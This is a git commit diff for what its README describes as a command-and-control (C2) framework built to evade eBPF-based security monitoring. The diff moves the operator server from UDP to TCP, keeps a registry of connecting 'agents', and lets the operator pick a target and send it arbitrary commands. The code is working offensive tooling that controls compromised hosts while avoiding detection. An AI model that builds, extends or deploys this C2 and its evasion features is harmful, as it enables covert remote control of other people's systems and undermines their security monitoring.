d533dc3902217a7287367bce80893ac243e7876b
Siren <siren@kernal.eu>
2024-03-16 23:27:09 +0200

    Fix server networking

--- README.md
+++ README.md
@@ -6,6 +6,7 @@ This is a C2 that uses various techniques to evade from eBPF based security moni
 * [Userland exec / reflective ELF loading](https://grugq.github.io/docs/ul_exec.txt).
 * Event spamming / resource exhaustion.
 * Sockets and TCP connection using io_uring.
+* Map tampering (TODO).
 
 ## Commands
 
--- server.py
+++ server.py
@@ -8,67 +8,74 @@ from prompt_toolkit import prompt
 from prompt_toolkit.patch_stdout import patch_stdout
 from prompt_toolkit import HTML, print_formatted_text as print
 
+known_agents = {}
+bufsize = 4096
+running = True
+
 def main():
     bind_ip = '0.0.0.0'
     bind_port = 12345
-    bufsize = 4096
 
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    server_socket.bind((bind_ip, bind_port))
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.settimeout(10)
+    server_socket.bind((bind_ip, bind_port))
+    server_socket.listen()
 
-    known_clients = {}
-    active_client = None
-    running = True
+    active_agent = None
 
-    def handle_incoming():
-        while running:
-            try:
-                data, client_address = server_socket.recvfrom(bufsize)
-            except TimeoutError:
-                pass
-            else:
-                if len(data) == 0:
-                   continue
-                resp = data.decode().rstrip()
-                addr_str = "%s:%d" % client_address
-                if addr_str not in known_clients:
-                    print(HTML("<ansigreen>New agent %s connected</ansigreen>" % addr_str))
-                    known_clients[addr_str] = client_address
-                if resp != "ready":
-                    print("resp" + resp)
-
-
-    t = threading.Thread(target=handle_incoming)
-    t.daemon = True
+    t = threading.Thread(target=handle_new_agent, args=[server_socket])
     t.start()
+    global running
 
     try:
         while running:
             with patch_stdout():
-                if active_client is None:
+                if active_agent is None:
                     cmd = prompt("> ")
                 else:
-                    cmd = prompt("(%s)> " %  active_client)
+                    cmd = prompt("(%s)> " %  active_agent)
 
                 tokenized = cmd.split(None)
                 if tokenized[0] == "use":
-                    if tokenized[1] in known_clients:
-                        active_client = tokenized[1]
+                    if tokenized[1] in known_agents:
+                        active_agent = tokenized[1]
                         print("Set active target to %s" % tokenized[1])
                     else:
                         print(HTML("<ansired>Unknown target</ansired>"))
                 else:
-                    if active_client is None:
+                    if active_agent is None:
                         print(HTML("<ansired>Pick a target first: target target_address</ansired>"))
                         continue
                     if cmd is not None:
-                        server_socket.sendto(cmd.encode(), known_clients[active_client])
+                        known_agents[active_agent].send(cmd.encode())
     except KeyboardInterrupt:
-        pass
-    finally:
         running = False
+        print(HTML("<ansiblue>Waiting for threads to finish...</ansiblue>"))
+        t.join()
         server_socket.close()
+        exit(0)
+
+def handle_new_agent(server_socket):
+    global running
+    while running:
+        try:
+            conn, client_address = server_socket.accept()
+            addr_str = "%s:%d" % client_address
+            print(HTML("<ansigreen>New agent %s connected</ansigreen>" % addr_str))
+            known_agents[addr_str] = conn
+            t1 = threading.Thread(target=handle_agent_response, args=[conn]).start()
+        except TimeoutError:
+            continue
+
+def handle_agent_response(conn):
+    global running
+    while running:
+        data = conn.recv(bufsize)
+        if len(data) == 0:
+            continue
+        resp = data.decode().rstrip()
+        if resp != "ready":
+            print("resp" + resp)
 
 if __name__ == "__main__":
     main()
